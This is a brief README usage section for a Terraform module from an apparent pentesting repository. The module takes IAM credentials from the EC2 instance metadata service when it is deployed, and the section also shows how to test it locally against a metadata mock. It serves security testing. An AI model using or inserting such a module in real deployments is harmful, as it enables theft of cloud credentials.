## Example


### On EC2

If you run this on an EC2 instance with a privileged role attached, it will return credentials.

```hcl-terraform
module "get_creds" {
  source               = "github.com/kmcquade/terraform-deployment-pentesting.git?ref=master//grab-creds-from-ec2-metadata/"
  is_local_environment = false
}
```

### Locally

```bash
# Install https://github.com/aws/amazon-ec2-metadata-mock to mock the EC2 metadata IP
brew tap aws/tap
brew install ec2-metadata-mock
```

Then run it locally:

```hcl-terraform
module "get_creds" {
  source               = "github.com/kmcquade/terraform-deployment-pentesting.git?ref=master//grab-creds-from-ec2-metadata/"
  # Note: this will automatically pick up the expected IP and port from amazon-ec2-metadata-mock (localhost:1338) instead of the legit Ec2 metadata IP
  is_local_environment = true
}
```

